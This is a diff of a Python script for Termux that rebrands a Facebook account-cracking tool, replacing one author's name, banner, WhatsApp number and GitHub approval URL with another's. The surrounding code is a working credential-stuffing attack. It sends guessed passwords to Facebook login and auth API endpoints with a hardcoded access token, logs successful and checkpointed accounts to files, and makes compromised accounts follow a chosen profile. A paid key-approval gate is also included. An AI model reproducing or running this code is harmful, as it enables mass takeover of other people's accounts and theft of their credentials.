@@ -86,7 +86,7 @@ def back():
 
 ahsan="Mr-"
 imt="-2.0=="
-ak="K4US4R-"
+ak="RAKIB-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrkausar-cov', 'r').read()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ K4US4R ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ RAKIB ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ K4US4R-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ RAKIB-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ NAHID-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [RAKIB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ NAHID-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ RAKIB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/NAHID-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/RAKIB-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -388,21 +388,21 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
-\x1b[1;92m #     #    #    #     # ### ######  
-\x1b[1;92m ##    #   # #   #     #  #  #     # 
-\x1b[1;92m # #   #  #   #  #     #  #  #     # 
-\x1b[1;92m #  #  # #     # #######  #  #     # 
-\x1b[1;92m #   # # ####### #     #  #  #     # 
-\x1b[1;92m #    ## #     # #     #  #  #     # 
-\x1b[1;92m #     # #     # #     # ### ######  
-
+  _____            _  _______ ____  
+ |  __ \     /\   | |/ /_   _|  _ \ 
+ | |__) |   /  \  | ' /  | | | |_) |
+ |  _  /   / /\ \ |  <   | | |  _ < 
+ | | \ \  / ____ \| . \ _| |_| |_) |
+ |_|  \_\/_/    \_\_|\_\_____|____/ 
+                                    
+                                    
    \x1b[1;92m╔═════════════════════════════╗
-   \x1b[1;92m║➣TOOL NAME : { MD Nahid }   ║
-   \x1b[1;92m║➣AUTHOR    : Md Nahid       ║
-   \x1b[1;92m║➣WHATSAPP    : 01923092304 ║
-   \x1b[1;92m║➣FACEBOOK  : Kausar Ahamed   ║
-   \x1b[1;92m║➣Group     : 5G Spammer Team ║
-   \x1b[1;92m║➣WHATSAPP  : [ ERROR ]       ║
+   \x1b[1;92m║➣TOOL NAME : {OLD CLONE  }   ║
+   \x1b[1;92m║➣AUTHOR    : ARIYAN AHMMED RAKIB     ║
+   \x1b[1;92m║➣WHATSAPP    : +9960531382117║
+   \x1b[1;92m║➣FACEBOOK  : SAIFUL HASAN   ║
+   \x1b[1;92m║➣Group     : TERMUX COMMAD 2022 ║
+   \x1b[1;92m║➣WHATSAPP  : [ ITZ ARIYAN RAKIB]       ║
    \x1b[1;92m╚═════════════════════════════╝""")
 
 class Main:
@@ -1275,15 +1275,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ NAHID-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ RAKIB-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-NAHID-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-RAKIB-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ NAHID-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ RAKIB-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-NAHID-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RAKIB-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1295,7 +1295,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrkausar-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/NAHID-AFRIDY/NAHID-YT/blob/main/Approved.txt").text
+	r1=requests.get("https://github.com/MRRAKIB-404CYBER/RANDOM-OLD/blob/main/appro.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1308,7 +1308,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m NAHID Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m RAKIBTool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1321,6 +1321,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+8801923092304?text=' + tks)
+		os.system('am start https://wa.me/+9960531382117?text=' + tks)
 		Subscraption()        
 Subscraption()
